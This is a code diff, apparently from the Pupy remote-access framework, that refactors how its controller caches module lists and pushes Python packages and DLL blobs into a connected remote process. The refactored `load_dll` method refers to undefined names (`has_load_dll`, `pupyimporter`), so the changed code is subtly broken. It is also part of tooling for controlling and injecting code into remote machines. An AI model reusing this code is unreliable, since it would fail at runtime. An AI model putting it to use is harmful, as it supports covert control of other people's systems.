@@ -25,6 +25,7 @@ import imp
 import platform
 
 from pupylib.payloads import dependencies
+from pupylib.utils.rpyc_utils import obtain
 
 ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), '..'))
 
@@ -39,8 +40,14 @@ class PupyClient(object):
         #alias
         self.conn = self.desc["conn"]
         self.pupsrv = pupsrv
-        self.load_pupyimporter()
         self.imported_dlls = set()
+        self.imported_modules = set()
+        self.cached_modules = set()
+        self.pupyimporter = None
+        self.has_load_dll = False
+        self.has_new_dlls = False
+        self.has_new_modules = False
+        self.load_pupyimporter()
 
         #to reuse impersonated handle in other modules
         self.impersonated_dupHandle = None
@@ -204,19 +211,26 @@ class PupyClient(object):
                 """))
             self.conn.namespace["pupyimporter_preimporter"](pupyimporter_code)
 
-        pupyimporter = self.conn.modules.pupyimporter
+        self.pupyimporter = self.conn.modules.pupyimporter
 
         try:
-            self.conn._conn.root.register_cleanup(pupyimporter.unregister_package_request_hook)
-            pupyimporter.register_package_request_hook(self.remote_load_package)
+            self.conn._conn.root.register_cleanup(self.pupyimporter.unregister_package_request_hook)
+            self.pupyimporter.register_package_request_hook(self.remote_load_package)
         except:
             pass
 
         try:
-            self.conn._conn.root.register_cleanup(pupyimporter.unregister_package_error_hook)
-            pupyimporter.register_package_error_hook(self.remote_print_error)
+            self.conn._conn.root.register_cleanup(self.pupyimporter.unregister_package_error_hook)
+            self.pupyimporter.register_package_error_hook(self.remote_print_error)
         except:
             pass
+
+        self.has_load_dll = hasattr(self.pupyimporter, 'load_dll')
+        self.has_new_dlls = hasattr(self.pupyimporter, 'new_dlls')
+        self.has_new_modules = hasattr(self.pupyimporter, 'new_modules')
+
+        self.imported_modules = set(obtain(self.conn.modules.sys.modules.keys()))
+        self.cached_modules = set(obtain(self.pupyimporter.modules.keys()))
 
     def load_dll(self, path):
         """
@@ -231,8 +245,7 @@ class PupyClient(object):
         if not buf:
             raise ImportError('Shared object {} not found'.format(name))
 
-        pupyimporter = self.conn.modules.pupyimporter
-        if hasattr(pupyimporter, 'load_dll'):
+        if has_load_dll:
             result = pupyimporter.load_dll(name, buf)
         else:
             result = self.conn.modules.pupy.load_dll(name, buf)
@@ -245,21 +258,37 @@ class PupyClient(object):
         return True
 
     def filter_new_modules(self, modules, dll, force=None):
-        pupyimporter = self.conn.modules.pupyimporter
+        if force is None:
+            modules = set(
+                x for x in modules if not x in self.imported_modules
+            )
+
+            modules = set(
+                module for module in modules if not any(
+                    cached_module.startswith(
+                        tuple(x.format(module.replace('.', '/')) for x in (
+                            '{}.py', '{}/__init__.py', '{}.pyd', '{}.so',
+                        ))
+                    ) for cached_module in self.cached_modules
+                )
+            )
+
+        if not modules:
+            return []
 
         if dll:
-            if hasattr(pupyimporter, 'new_dlls'):
-                return pupyimporter.new_dlls(modules)
+            if self.has_new_dlls:
+                return self.pupyimporter.new_dlls(modules)
             else:
                 return [
                     module for module in modules if not module in self.imported_dlls
                 ]
         else:
-            if hasattr(pupyimporter, 'new_modules'):
-                new_modules = pupyimporter.new_modules(modules)
+            if self.has_new_modules :
+                new_modules = self.pupyimporter.new_modules(modules)
             else:
                 new_modules = [
-                    module for module in modules if not pupyimporter.has_module(module)
+                    module for module in modules if not self.pupyimporter.has_module(module)
                 ]
 
             if not force is None:
@@ -272,8 +301,6 @@ class PupyClient(object):
                 return new_modules
 
     def load_package(self, requirements, force=False, remote=False, new_deps=[]):
-        pupyimporter = self.conn.modules.pupyimporter
-
         try:
             forced = None
             if force:
@@ -287,24 +314,33 @@ class PupyClient(object):
                 )
             )
 
+            self.cached_modules.update(contents)
+
         except dependencies.NotFoundError, e:
             raise ValueError('Module not found: {}'.format(e))
+
+        if not contents and not dlls:
+            return False
+
+        if dlls:
+            if self.has_load_dll:
+                for name, blob in dlls:
+                    self.pupyimporter.load_dll(name, blob)
+            else:
+                for name, blob in dlls:
+                    self.conn.modules.pupy.load_dll(name, blob)
+
+            if not contents:
+                return True
 
         if not contents:
             return False
 
-        if hasattr(pupyimporter, 'load_dll'):
-            for name, blob in dlls:
-                pupyimporter.load_dll(name, blob)
-        else:
-            for name, blob in dlls:
-                self.conn.modules.pupy.load_dll(name, blob)
-
         if forced:
             for module in forced:
-                pupyimporter.invalidate_module(module)
+                self.pupyimporter.invalidate_module(module)
 
-        pupyimporter.pupy_add_package(
+        self.pupyimporter.pupy_add_package(
             packages,
             compressed=True,
             # Use None to prevent import-then-clean-then-search behavior
@@ -319,7 +355,7 @@ class PupyClient(object):
 
     def unload_package(self, module_name):
         if not module_name.endswith(('.so', '.dll', '.pyd')):
-            self.conn.modules.pupyimporter.invalidate_module(module_name)
+            self.pupyimporter.invalidate_module(module_name)
 
     def remote_load_package(self, module_name):
         logging.debug("remote module_name asked for : %s"%module_name)
